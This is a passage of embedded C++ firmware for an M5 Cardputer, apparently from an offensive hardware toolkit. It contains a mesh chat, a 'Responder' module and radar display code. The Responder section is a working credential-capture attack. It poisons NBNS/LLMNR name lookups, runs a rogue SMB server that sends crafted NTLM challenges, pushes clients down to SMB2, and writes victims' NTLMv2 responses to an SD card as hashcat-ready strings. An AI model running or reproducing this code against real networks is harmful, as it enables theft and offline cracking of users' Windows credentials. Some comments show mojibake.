    if (messages.size() < 20) messages.assign(20, Message());
    strncpy(messages[messageHead].content, m, MAX_MSG_LEN - 1);
    messages[messageHead].content[MAX_MSG_LEN - 1] = '\0';
    messageHead = (messageHead + 1) % 20;
    if (messageCount < 20) messageCount++;
}

// rafraÃ®chit lâ€™Ã©cran
void drawChatWindow() {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.setCursor(5, 5);
    M5.Display.printf("Connected: %d", nodesCount);

    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(5, 10);

    const int lines = 13;
    int start = (messageCount < lines) ? 0 : (messageHead + 20 - lines) % 20;
    for (int i = 0; i < min(lines, messageCount); ++i) {
        int idx = (start + i) % 20;
        M5.Display.println(messages[idx].content);
    }
    M5.Display.display();
}

/* ---------- Traitement dâ€™un paquet en attente ---------- */
void handleIncomingPacket(const uint8_t* data, int len) {
    if (len != sizeof(MeshMessage) + sizeof(uint16_t)) return;

    uint16_t rxCrc;
    memcpy(&rxCrc, data + sizeof(MeshMessage), sizeof(uint16_t));
    if (rxCrc != crc16(data, sizeof(MeshMessage))) return;

    MeshMessage msg;
    memcpy(&msg, data, sizeof(MeshMessage));

    if (hasSeenId(msg.id)) return;
    rememberId(msg.id);

    // --- Gestion du PING (mise Ã  jour de prÃ©sence) ---
    if (strcmp(msg.body, "PING") == 0) {
        updatePresence(msg.from);
        esp_now_send(broadcastAddressEspNow, data, len);
        return;                               // pas dâ€™affichage
    }
    // --- Filtre messages "System" visant ce client ---
    if (!strcmp(msg.from, "System") && strstr(msg.body, currentNick))
        return;

    char line[MAX_MSG_LEN + 16];
    snprintf(line, sizeof(line), "%s: %s", msg.from, msg.body);
    addMessage(line);
    drawChatWindow();

    esp_now_send(broadcastAddressEspNow, data, len);
}

/* ----- Commandes ----- */
void handleCommand(const char* in) {
    if (!strncmp(in, "/nick ", 6)) {
        strncpy(currentNick, in + 6, 15); currentNick[15] = '\0';
        char l[MAX_MSG_LEN]; snprintf(l, sizeof(l),
                         "Nickname set to: %s", currentNick);
        addMessage(l); drawChatWindow();

    } else if (!strcmp(in, "/clear")) {
        messageCount = messageHead = 0; drawChatWindow();

    } else if (!strncmp(in, "/me ", 4)) {
        char act[MAX_MSG_LEN];
        snprintf(act, sizeof(act), "* %s %s", currentNick, in + 4);
        broadcastChatMessage(currentNick, act);

    } else if (!strcmp(in, "/people")) {
        addMessage("-> Users online:");
        char b[MAX_MSG_LEN];
        for (int i = 0; i < nodesCount; ++i) {
            snprintf(b, sizeof(b), " %s", nodesConnected[i].nick);
            addMessage(b);
        }
        drawChatWindow();

    } else if (!strcmp(in, "/help")) {
        addMessage("/nick <name> : change pseudo");
        addMessage("/me <action> : action roleplay");
        addMessage("/clear       : clear the chat");
        addMessage("/people      : list connected");
        drawChatWindow();

    } else {
        addMessage("Unknown command. /help"); drawChatWindow();
    }
}

/* ----- Envoi dâ€™un message Chat (hors callback) ----- */
void broadcastChatMessage(const char* from, const char* body) {
    MeshMessage msg;
    char hash[9], tmp[MAX_MSG_LEN+32];
    snprintf(tmp, sizeof(tmp), "%s%s%lu", from, body, millis());
    simpleHash(tmp, hash);

    strncpy(msg.id,   hash, 8); msg.id[8] = '\0';
    strncpy(msg.from, from, 15); msg.from[15] = '\0';
    strncpy(msg.body, body, MAX_MSG_LEN-1); msg.body[MAX_MSG_LEN-1]='\0';

    uint8_t pkt[sizeof(MeshMessage)+2];
    memcpy(pkt, &msg, sizeof(MeshMessage));
    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
    memcpy(pkt + sizeof(MeshMessage), &crc, 2);

    esp_now_send(broadcastAddressEspNow, pkt, sizeof(pkt));
    rememberId(msg.id);

    char line[MAX_MSG_LEN+32];
    snprintf(line, sizeof(line), "%s: %s", from, body);
    addMessage(line); drawChatWindow();
}

/* ----- Ping pÃ©riodique ----- */
void broadcastPing() {
    MeshMessage msg;
    char hash[9], tmp[32];

    // hash = from + "PING" + horodatage
    snprintf(tmp, sizeof(tmp), "%sPING%lu", currentNick, millis());
    simpleHash(tmp, hash);

    strncpy(msg.id,   hash, 8);  msg.id[8]   = '\0';
    strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
    strncpy(msg.body, "PING", MAX_MSG_LEN - 1);
    msg.body[MAX_MSG_LEN - 1] = '\0';

    uint8_t pkt[sizeof(MeshMessage) + 2];
    memcpy(pkt, &msg, sizeof(MeshMessage));
    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
    memcpy(pkt + sizeof(MeshMessage), &crc, 2);

    esp_now_send(broadcastAddressEspNow, pkt, sizeof(pkt));
    rememberId(msg.id);           // pour ignorer notre propre Ã©cho
}


/* ----- Gestion de prÃ©sence ----- */
void updatePresence(const char* nick) {
    for (int i = 0; i < nodesCount; ++i)
        if (!strcmp(nodesConnected[i].nick, nick)) {
            nodesConnected[i].lastSeen = millis(); return;
        }

    if (nodesCount < MAX_NODES) {
        if (nodesConnected.size() < MAX_NODES) nodesConnected.resize(MAX_NODES);
        strncpy(nodesConnected[nodesCount].nick, nick, 15);
        nodesConnected[nodesCount].nick[15] = '\0';
        nodesConnected[nodesCount].lastSeen = millis();
        ++nodesCount;
    }
}
void checkPresenceTimeouts() {
    unsigned long now = millis();
    for (int i = 0; i < nodesCount; ++i)
        if ((now - nodesConnected[i].lastSeen) > TIMEOUT_PRESENCE) {
            char m[MAX_MSG_LEN];
            snprintf(m, sizeof(m), "%s left the chat!", nodesConnected[i].nick);
            broadcastChatMessage("System", m);

            for (int j = i; j < nodesCount-1; ++j)
                nodesConnected[j] = nodesConnected[j+1];
            --nodesCount; --i;
        }
}

// ----- Gestion clavier & saisie utilisateur -----
void handleKeyboard() {
    if (!M5Cardputer.Keyboard.isPressed()) return;

    Keyboard_Class::KeysState st = M5Cardputer.Keyboard.keysState();

    /* Ajout des caractÃ¨res tapÃ©s */
    for (char c : st.word) {
        int n = strlen(inputBuffer);
        if (n < MAX_MSG_LEN - 2) {              // -2 : place pour '\0'
            inputBuffer[n]   = c;
            inputBuffer[n+1] = '\0';
        }
    }
    /* Backspace */
    if (st.del && *inputBuffer)
        inputBuffer[strlen(inputBuffer) - 1] = '\0';

    /* EntrÃ©e : envoi */
    if (st.enter && *inputBuffer) {
        if (inputBuffer[0] == '/')
            handleCommand(inputBuffer);
        else
            broadcastChatMessage(currentNick, inputBuffer);

        inputBuffer[0] = '\0';
    }

    /* Ligne dâ€™Ã©dition */
    M5.Display.fillRect(0, 120, 240, 16, TFT_NAVY);
    M5.Display.setCursor(5, 120);
    M5.Display.setTextColor(TFT_YELLOW);
    M5.Display.print("> ");
    M5.Display.print(inputBuffer);
}

// ----- Fonction principale -----
void EvilChatMesh() {
    M5.begin();
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.fillScreen(TFT_BLACK);

    WiFi.disconnect(true); delay(100);
    WiFi.mode(WIFI_STA);

    if (esp_now_init() != ESP_OK) {
        M5.Display.println("ESPâ€‘NOW init failed"); return;
    }
    esp_now_register_recv_cb(OnDataRecvChat);

    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, broadcastAddressEspNow, 6);
    peer.channel = 0; peer.encrypt = false;
    if (!esp_now_is_peer_exist(peer.peer_addr))
        esp_now_add_peer(&peer);

    nodesConnected.clear(); nodesConnected.resize(MAX_NODES);
    messages.assign(20, Message());
    drawChatWindow();

    char msgArr[MAX_MSG_LEN];
    snprintf(msgArr, sizeof(msgArr), "%s enter the chat!", currentNick);
    broadcastChatMessage("System", msgArr);

    /* ---------- Boucle ---------- */
    while (true) {
        M5.update(); M5Cardputer.update();

        /* 1. paquet reÃ§u ? */
        if (newPacketPending) {
            noInterrupts();
            uint8_t localBuf[sizeof(MeshMessage)+2];
            int     len = packetLen;
            memcpy(localBuf, (const void*)packetBuffer, len);
            newPacketPending = false;
            interrupts();

            handleIncomingPacket(localBuf, len);
        }

        /* 2. ping & timeouts */
        unsigned long now = millis();
        if (now - lastPing > PING_INTERVAL) {
            lastPing = now; broadcastPing();
        }
        checkPresenceTimeouts();

        /* 3. clavier */
        if (M5Cardputer.Keyboard.isChange())
            handleKeyboard();

        /* 4. touche ` pour quitter */
        if (M5Cardputer.Keyboard.isKeyPressed('`')) {
            char m[MAX_MSG_LEN];
            snprintf(m, sizeof(m), "%s left the chat!", currentNick);
            broadcastChatMessage("System", m);

            esp_now_unregister_recv_cb();
            esp_now_deinit();
            waitAndReturnToMenu("Left the chat...");
            return;
        }
        delay(10);
    }
}


/*
============================================================================================================================
Responder
============================================================================================================================
*/

int hashCount = 0;
String lastUser = "";
String lastDomain = "";
String lastQueryName     = "";  // nom interrogÃ© (NBNS/LLMNR)
String lastQueryProtocol = "";  // "NBNS" ou "LLMNR"
String lastClient        = "";  //hostname SMB

// Ports pour NBNS et LLMNR
const uint16_t NBNS_PORT = 137;
const uint16_t LLMNR_PORT = 5355;

// Objet UDP pour NBNS et LLMNR
WiFiUDP nbnsUDP;
WiFiUDP llmnrUDP;

// Serveur TCP SMB (port 445)
WiFiServer smbServer(445);

// Structure pour stocker un client SMB en cours et ses infos
struct SMBClientState {
  WiFiClient client;
  bool active;
  uint64_t sessionId;
  uint8_t challenge[8];
} smbState;

/* =================  CONST & FLAGS SMB  ================= */
#define SMB_FLAGS_REPLY               0x80
#define SMB_FLAGS2_UNICODE            0x8000
#define SMB_FLAGS2_ERR_STATUS32       0x4000
#define SMB_FLAGS2_EXTSEC             0x0800
#define SMB_FLAGS2_SIGNING_ENABLED    0x0008

#define SMB_CAP_EXTSEC      0x80000000UL
#define SMB_CAP_LARGE_FILES 0x00000008UL
#define SMB_CAP_NT_SMBS     0x00000010UL
#define SMB_CAP_UNICODE     0x00000004UL
#define SMB_CAP_STATUS32    0x00000040UL

const uint32_t SMB_CAPABILITIES =
  SMB_CAP_EXTSEC | SMB_CAP_LARGE_FILES | SMB_CAP_NT_SMBS |
  SMB_CAP_UNICODE | SMB_CAP_STATUS32;      // â‰ˆ 0x8000005C
/* ====================================================== */


void encodeNetBIOSName(const char* name, uint8_t out[32]) {
  // PrÃ©parer le nom sur 15 caractÃ¨res (pad avec espaces) + type (0x20)
  char namePad[16];
  memset(namePad, ' ', 15);
  namePad[15] = 0x20; // suffixe type 0x20 (Server service)
  // Copier le nom en majuscules dans namePad
  size_t n = strlen(name);
  if (n > 15) n = 15;
  for (size_t i = 0; i < n; ++i) {
    namePad[i] = toupper(name[i]);
  }
  // Encoder chaque octet en deux caractÃ¨res 'A' Ã  'P'
  for (int i = 0; i < 16; ++i) {
    uint8_t c = (uint8_t)namePad[i];
    uint8_t highNibble = (c >> 4) & 0x0F;
    uint8_t lowNibble = c & 0x0F;
    out[2 * i]     = 0x41 + highNibble;
    out[2 * i + 1] = 0x41 + lowNibble;
  }
}

IPAddress getIPAddress() {
    // 1) Station mode
    if (WiFi.status() == WL_CONNECTED) {
        IPAddress ip = WiFi.localIP();
        if (ip && ip != IPAddress(0,0,0,0)) {
            return ip;
        }
    }
    // 2) SoftAP mode
    if (WiFi.getMode() & WIFI_MODE_AP) {
        IPAddress ip = WiFi.softAPIP();
        if (ip && ip != IPAddress(0,0,0,0)) {
            return ip;
        }
    }
    return IPAddress(0,0,0,0);
}

uint64_t getWindowsTimestamp() {
  const uint64_t EPOCH_DIFF = 11644473600ULL;
  struct timeval tv;
  gettimeofday(&tv, NULL);
  return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
}

// Buffer pour le NTLM Type 2 gÃ©nÃ©rÃ© dynamiquement
uint8_t ntlmType2Buffer[512];
uint16_t ntlmType2Len = 0;


void buildNTLMType2Msg(uint8_t *challenge, uint8_t *buffer, uint16_t *len) {
  const char* netbiosName = "EVIL-M5Project";
  const char* netbiosDomain = "EVILGROUP";
  const char* dnsDomain = "EVIL.LOCAL";

  uint8_t avPairs[512];
  int offset = 0;

  auto appendAVPair = [&](uint16_t type, const char* data) {
    int l = strlen(data);
    avPairs[offset++] = type & 0xFF;
    avPairs[offset++] = (type >> 8) & 0xFF;
    avPairs[offset++] = (l * 2) & 0xFF;
    avPairs[offset++] = ((l * 2) >> 8) & 0xFF;
    for (int i = 0; i < l; i++) {
      avPairs[offset++] = data[i];
      avPairs[offset++] = 0x00;
    }
  };

  appendAVPair(0x0001, netbiosName);
  appendAVPair(0x0002, netbiosDomain);
  appendAVPair(0x0003, netbiosName);
  appendAVPair(0x0004, dnsDomain);
  appendAVPair(0x0005, dnsDomain);

  // Timestamp AV Pair
  avPairs[offset++] = 0x07; avPairs[offset++] = 0x00;
  avPairs[offset++] = 0x08; avPairs[offset++] = 0x00;
  uint64_t ts = getWindowsTimestamp();
  memcpy(avPairs + offset, &ts, 8);
  offset += 8;

  // End AV Pair
  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;
  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;

  // PrÃ©parer NTLM Type 2 message
  const int NTLM_HEADER_SIZE = 48;
  memcpy(buffer, "NTLMSSP\0", 8); // Signature
  buffer[8] = 0x02; buffer[9] = 0x00; buffer[10] = buffer[11] = 0x00; // Type 2

  // Target Name
  uint16_t targetLen = strlen(netbiosName) * 2;
  buffer[12] = targetLen & 0xFF; buffer[13] = (targetLen >> 8) & 0xFF;
  buffer[14] = buffer[12]; buffer[15] = buffer[13];
  *(uint32_t*)(buffer + 16) = NTLM_HEADER_SIZE;

  // Flags standards recommandÃ©s pour NTLMv2
  *(uint32_t*)(buffer + 20) = 0xE2898215;

  // Challenge de 8 octets
  memcpy(buffer + 24, challenge, 8);
  memset(buffer + 32, 0, 8); // Reserved

  // AV Pair offset & length
  uint16_t avLen = offset;
  *(uint16_t*)(buffer + 40) = avLen;
  *(uint16_t*)(buffer + 42) = avLen;
  *(uint32_t*)(buffer + 44) = NTLM_HEADER_SIZE + targetLen;

  // Copie TargetName en UTF16LE
  for (int i = 0; i < strlen(netbiosName); i++) {
    buffer[NTLM_HEADER_SIZE + 2 * i] = netbiosName[i];
    buffer[NTLM_HEADER_SIZE + 2 * i + 1] = 0x00;
  }

  // Copie AV Pairs aprÃ¨s TargetName
  memcpy(buffer + NTLM_HEADER_SIZE + targetLen, avPairs, avLen);

  *len = NTLM_HEADER_SIZE + targetLen + avLen;
}

String readUTF16(uint8_t* pkt, uint32_t offset, uint16_t len) {
  String res = "";
  for (uint16_t i = 0; i < len; i += 2) {
    res += (char)pkt[offset + i];
  }
  return res;
}

void extractAndPrintHash(uint8_t* pkt, uint32_t smbLength, uint8_t* ntlm) {
  // 1. Little-endian helpers
  auto le16 = [](uint8_t* p) -> uint16_t {
    return p[0] | (p[1] << 8);
  };
  auto le32 = [](uint8_t* p) -> uint32_t {
    return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
  };

  uint32_t base = ntlm - pkt;  // offset of NTLMSSP in packet

  // 2. Offsets and lengths in NTLM AUTH message
  uint16_t ntRespLen   = le16(ntlm + 20);
  uint32_t ntRespOff   = le32(ntlm + 24);
  uint16_t domLen      = le16(ntlm + 28);
  uint32_t domOffset   = le32(ntlm + 32);
  uint16_t userLen     = le16(ntlm + 36);
  uint32_t userOffset  = le32(ntlm + 40);
  uint16_t wsLen       = le16(ntlm + 44);
  uint32_t wsOffset    = le32(ntlm + 48);

  // 3. Read UTF-16LE â†’ ASCII
  auto readUTF16 = [&](uint32_t offset, uint16_t len) -> String {
    String s = "";
    if (base + offset + len > smbLength) return s;  // safety
    for (uint16_t i = 0; i < len; i += 2)
      s += (char)pkt[base + offset + i];
    return s;
  };

  String domain      = readUTF16(domOffset,  domLen);
  String username    = readUTF16(userOffset, userLen);
  String workstation = readUTF16(wsOffset, wsLen);

  // 4. Server challenge (8 bytes)
  char challHex[17];
  for (int i = 0; i < 8; ++i)
    sprintf(challHex + 2*i, "%02X", smbState.challenge[i]);
  challHex[16] = '\0';

  // 5. Full NTLMv2 response en hex
  String ntRespHex;
  for (uint16_t i = 0; i < ntRespLen; ++i) {
    char h[3];
    sprintf(h, "%02X", pkt[base + ntRespOff + i]);
    ntRespHex += h;
  }

  // 6. Split proof & blob
  String ntProof = ntRespHex.substring(0, 32);
  String blob    = ntRespHex.substring(32);

  // 7. Format hashcat string
  String finalHash = "------------------------------------\n Client : " + lastClient + " \n" + username + "::" + domain + ":" + String(challHex) + ":" + ntProof + ":" + blob;

  Serial.println(F("------- Captured NTLMv2 Hash -------"));
  Serial.println(finalHash);
  Serial.println(F("------------------------------------"));

  // 8. Save sur SD
  File file = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_APPEND);
  if (file) {
    file.println(finalHash);
    file.close();
    Serial.println(F("â†’ Hash saved to /ntlm_hashes.txt"));
  } else {
    Serial.println(F("Error: unable to write to SD card!"));
  }

  // 9. Mettre Ã  jour UI
  hashCount++;
  lastUser          = username;
  lastDomain        = domain;
  lastClient        = workstation;
  updateHashUI();
}


void terminateSMB1() {
  smbState.client.stop();
  smbState.active = false;
  Serial.println(F("Session SMB1 stopped."));
}

// Token ASN.1 SPNEGO  â€“  annonce Â« NTLMSSP Â» uniquement
const uint8_t spnegoInitToken[] = {
  0x60, 0x3A,
  0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02,   //  OID 1.3.6.1.5.5.2
  0xA0, 0x30,                                         //  [0] NegTokenInit
  0x30, 0x2E,                                     //    mechTypes
  0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, // NTLM OID
  0xA2, 0x20,                                     //    reqFlags   (optionnel)
  0x30, 0x1E,
  0x02, 0x01, 0x02,                       //      mutualâ€‘auth
  0x02, 0x01, 0x00                        //      delegation = 0
};

void sendSMB1NegotiateResponse(uint8_t* req) {
  uint8_t resp[256] = {0};

  /* â”€â”€â”€ NBSS â”€â”€â”€ */
  resp[0] = 0x00;               // Session message â€“ length rempli plus bas

  /* â”€â”€â”€ HEADER SMB (32â€¯octets) â”€â”€â”€ */
  memcpy(resp + 4, req, 32);
  resp[4 + 4]  = 0x72;          // Command = NEGOTIATE
  resp[4 + 9]  = SMB_FLAGS_REPLY;

  *(uint16_t*)(resp + 4 + 10) =
    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
    SMB_FLAGS2_EXTSEC | SMB_FLAGS2_SIGNING_ENABLED;

  *(uint32_t*)(resp + 4 + 5) = 0x00000000;        // STATUS_SUCCESS

  /* â”€â”€â”€ PARAMS â”€â”€â”€ */
  const uint8_t WC = 17;
  resp[4 + 32] = WC;            // WordCount

  uint8_t* p = resp + 4 + 33;   // dÃ©but des 34 octets

  *(uint16_t*)(p +  0) = 0x0000;           // Dialect index (NT LM 0.12)
  *(uint8_t *)(p +  2) = 0x03;             // SecurityMode : userâ€‘level + signing supported
  *(uint16_t*)(p +  3) = 0x0100;           // MaxMpxCount
  *(uint16_t*)(p +  5) = 1;                // MaxVCs
  *(uint32_t*)(p +  7) = 0x00010000;       // MaxBufferSize
  *(uint32_t*)(p + 11) = 0x00010000;       // MaxRawSize
  *(uint32_t*)(p + 15) = 0;                // SessionKey
  *(uint32_t*)(p + 19) = SMB_CAPABILITIES; // Capabilities
  *(uint64_t*)(p + 23) = 0;                // SystemTime (optionnel)
  *(uint16_t*)(p + 31) = 0;                // TimeZone
  *(p + 33) = 0;                           // ChallengeLength = 0 (mode ExtSec)

  /* â”€â”€â”€ DATA (BCC) : SPNEGO Init â”€â”€â”€ */
  uint16_t bcc = sizeof(spnegoInitToken);
  *(uint16_t*)(resp + 4 + 33 + WC * 2) = bcc;
  memcpy(resp + 4 + 33 + WC * 2 + 2, spnegoInitToken, bcc);

  /* â”€â”€â”€ Longueur NBSS â”€â”€â”€ */
  uint32_t total = 4 + 33 + WC * 2 + 2 + bcc;
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  smbState.client.write(resp, total);
  Serial.println(F("â†’ Negotiate Response SMB1 envoyÃ© (ExtSec OK)"));
}

void sendSMB1Type2(uint8_t* req, uint8_t* ntlm1) {
  // 1) GÃ©nÃ¨re un challenge alÃ©atoire de 8 octets
  for (int i = 0; i < 8; ++i) {
    smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
  }

  // 2) Construit dynamiquement le blob NTLMv2 Type 2
  buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);

  // 3) PrÃ©pare la rÃ©ponse SessionSetupAndX SMB1
  uint8_t resp[512] = {0};

  // â€“ NBSS + header SMBv1 (copie 32 octets)
  memcpy(resp + 4, req, 32);
  resp[4 + 4] = 0x73;  // SMB_COM_SESSION_SETUP_ANDX
  resp[4 + 9] = SMB_FLAGS_REPLY;
  *(uint16_t*)(resp + 4 + 10) =
    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
    SMB_FLAGS2_EXTSEC  | SMB_FLAGS2_SIGNING_ENABLED;
  *(uint32_t*)(resp + 4 + 5) = 0xC0000016; // STATUS_MORE_PROCESSING_REQUIRED

  // â€“ WordCount et AndX
  resp[4 + 32] = 4;    // WordCount
  resp[4 + 33] = 0;    // no further AndX
  resp[4 + 34] = resp[4 + 35] = 0;

  // â€“ SecurityBlobLength et ByteCount = longueur du blob dynamique
  *(uint16_t*)(resp + 4 + 38) = ntlmType2Len; // SecurityBlobLength
  *(uint16_t*)(resp + 4 + 40) = ntlmType2Len; // ByteCount

  // â€“ Copier le blob NTLMv2 Type2 juste aprÃ¨s le header
  memcpy(resp + 4 + 42, ntlmType2Buffer, ntlmType2Len);

  // â€“ Calcul de la longueur NBSS
  uint32_t total = 4 + 42 + ntlmType2Len;
  resp[0] = 0x00;
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  // 4) Envoie
  smbState.client.write(resp, total);
  Serial.println(F("â†’ NTLMv2 Type 2 (SMB1) send"));
}

void handleSMB1(uint8_t* pkt, uint32_t len) {
  // Structure header SMBv1 (32 octets)
  uint8_t  command   = pkt[4];            // offset 4

  // ----------  NEGOTIATE (0x72)  ----------
  if (command == 0x72) {
    /* point de dÃ©part = tout de suite aprÃ¨s le BCC (2 octets)           */
    uint16_t bcc = pkt[33] | (pkt[34] << 8);      // ByteCount
    const uint8_t* d = pkt + 35;                  // <-- 35, pas 36
    const uint8_t* end = d + bcc;

    bool smb2Asked = false;
    while (d < end && *d == 0x02) {               // 0x02 = "dialect string"
      const char* name = (const char*)(d + 1);
      if (strncmp(name, "SMB 2", 5) == 0) {
        smb2Asked = true;
        break;
      }
      d += 2 + strlen(name);                    // 0x02 + chaÃ®ne + '\0'
    }

    if (smb2Asked) {
      Serial.println(F("Client ask for SMB 2 â†’ switch to SMB 2"));
      sendSMB2NegotiateFromSMB1();
    } else {
      Serial.println(F("Client stay in SMB 1"));
      sendSMB1NegotiateResponse(pkt);
    }
    return;
  }
  // ----------  SESSION SETUP ANDX (0x73) ----------
  if (command == 0x73) {                  // SMB_COM_SESSION_SETUP_ANDX
    uint16_t andxOffset = *(uint16_t*)(pkt + 45); // dÃ©but des donnÃ©es NTLM
    uint8_t* ntlm = pkt + andxOffset;

    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && len > andxOffset + 8) {
      uint8_t type = ntlm[8];
      if (type == 1) {                    // Type1 â†’ envoyer challenge
        Serial.println(F("NTLM Type 1 (SMB1) received"));
        sendSMB1Type2(pkt, ntlm);         // 2-b
      } else if (type == 3) {             // Type3 = hash capturÃ©
        Serial.println(F("NTLM Type 3 (SMB1) received"));
        extractAndPrintHash(pkt, len, ntlm);
        terminateSMB1();               // rÃ©ponse Â« SUCCESS Â» puis close
      }
    }
  }
}

void sendSMB2NegotiateFromSMB1() {
  uint8_t resp[256] = {0};

  /* â”€â”€ 1.  NBSS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
  resp[0] = 0x00;                 // Session message, LEN plus bas

  /* â”€â”€ 2.  HEADER SMBâ€‘2 (64â€¯oct.) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
  uint8_t* h = resp + 4;
  h[0] = 0xFE;  h[1] = 'S';  h[2] = 'M';  h[3] = 'B';
  h[4] = 0x40;  h[5] = 0x00;              // StructureSize = 64
  h[6] = 0x00;  h[7] = 0x00;              // CreditCharge
  h[8] = h[9] = h[10] = h[11] = 0x00;     // ChannelSequence / Reserved
  h[12] = 0x00; h[13] = 0x00;             // Command = NEGOTIATE
  h[14] = 0x01; h[15] = 0x00;             // CreditResponse = 1
  *(uint32_t*)(h + 16) = 0x00000001;      // Flags = SERVER_TO_REDIR
  *(uint32_t*)(h + 20) = 0x00000000;      // NextCommand = 0
  *(uint64_t*)(h + 24) = 0;               // MessageId   = 0
  *(uint32_t*)(h + 32) = 0x0000FEFF;      // ProcessId   (valeur Windows)
  *(uint32_t*)(h + 36) = 0;               // TreeId = 0
  *(uint64_t*)(h + 40) = 0;               // SessionId = 0
  memset(h + 48, 0, 16);                  // Signature (pas de signing)

  /* â”€â”€ 3.  Corps NEGOTIATE RESPONSE (65â€¯oct.) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
  uint8_t* p = h + 64;
  p[0] = 0x41; p[1] = 0x00;               // StructureSize = 65
  p[2] = 0x01; p[3] = 0x00;               // SecurityMode = signingâ€‘enabled
  p[4] = 0x02; p[5] = 0x02;               // DialectRevision = 0x0202 (SMB 2.002)
  p[6] = p[7] = 0x00;                     // Reserved

  /* Server GUID (16â€¯oct.) â€“ on fabrique quelque chose dâ€™unique */
  uint8_t serverGuid[16];
  for (int i = 0; i < 16; i++) serverGuid[i] = esp_random() & 0xFF;
  memcpy(p + 8, serverGuid, 16);


  *(uint32_t*)(p + 24) = 0x00000000;      // Capabilities (0 suffisent)
  *(uint32_t*)(p + 28) = 0x00010000;      // MaxTrans
  *(uint32_t*)(p + 32) = 0x00010000;      // MaxRead
  *(uint32_t*)(p + 36) = 0x00010000;      // MaxWrite
  memset(p + 40, 0, 16);                  // SystemTime + StartTime
  *(uint16_t*)(p + 56) = 0;               // SecBufOffset
  *(uint16_t*)(p + 58) = 0;               // SecBufLength
  /* (p+60..64  NeÌgContext = 0 / Reserved) */

  /* â”€â”€ 4.  Longueur NBSS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
  uint32_t total = 4 + 64 + 65;           // = 133
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  smbState.client.write(resp, total);
  Serial.println(F("â†’ Negotiate Response SMBâ€‘v2 send (upgrade successfull)"));
}

void addDetectionPoint() {
    static int callCount = 0;
    callCount++;
    if (callCount % 3 != 0) return;

    float dist = random(currentR / 2, currentR);
    int px = currentCx + cosf(currentAngle) * dist;
    int py = currentCy + sinf(currentAngle) * dist;

    DetPoint newP = { px, py, DET_TTL };
    if (detCount < MAX_DETECTIONS) {
        detections[detCount++] = newP;
    } else {
        // dÃ©calage vers la gauche pour faire de la place
        for (int i = 1; i < detCount; i++) {
            detections[i-1] = detections[i];
        }
        detections[detCount-1] = newP;
    }
}
void showWaitingAnimation() {
  static float angle = 0.0f;
  auto& d = M5Cardputer.Display;

  // texte dâ€™Ã©tat
  d.setTextSize(1.5);
  d.setTextColor(TFT_WHITE, TFT_BLACK);
  d.setCursor(5, 5);
  d.print("Waiting for LLMNR or NBNS");

  // position et rayon du radar
  int screenW = d.width();
  int screenH = d.height();
  int cx = screenW / 2;
  int cy = RADAR_R + RADAR_MARGIN + 10;
  int r  = RADAR_R;

  currentCx = cx;
  currentCy = cy;
  currentR  = r;
  currentAngle = angle;

  // fond
  d.fillCircle(cx, cy, r + 2, TFT_BLACK);

  // cercles concentriques
  d.drawCircle(cx, cy, r,         TFT_DARKGREY);
  d.drawCircle(cx, cy, r * 2 / 3, TFT_DARKGREY);
  d.drawCircle(cx, cy, r / 3,     TFT_DARKGREY);

  // croix (traits horizontaux et verticaux)
  d.drawLine(cx - r, cy, cx + r, cy, TFT_DARKGREY);
  d.drawLine(cx, cy - r, cx, cy + r, TFT_DARKGREY);

  // ligne de balayage
  int x2 = cx + cosf(angle) * r;
  int y2 = cy + sinf(angle) * r;
  d.drawLine(cx, cy, x2, y2, TFT_GREEN);

  // mise Ã  jour de lâ€™angle
  angle += 0.1f;
  if (angle >= 2 * PI) angle -= 2 * PI;

  // dessin des points avec fade-out
  for (int i = 0; i < detCount; i++) {
    auto& p = detections[i];
    float fade = float(p.ttl) / DET_TTL;
    uint16_t col = d.color565(
      uint8_t(173 * fade),
      uint8_t(255 * fade),
      uint8_t(47  * fade)
    );
    d.fillCircle(p.x, p.y, 3, col);
    if (--p.ttl <= 0) {
      for (int j = i; j < detCount - 1; j++)
        detections[j] = detections[j + 1];
      detCount--;
      i--;
    }
  }

  int yPos = screenH - 12;      // position verticale de la ligne
  d.fillRect(0, yPos, screenW, 12, TFT_BLACK);

  // --- Affichage â€œAskedâ€ ---
  d.setTextSize(1);
  d.setTextColor(TFT_WHITE, TFT_BLACK);
  d.setCursor(2, yPos);
  d.print("Request: ");
  d.print(lastQueryName);
}

void showActiveAnimation() {
  static float angle = 0.0f;
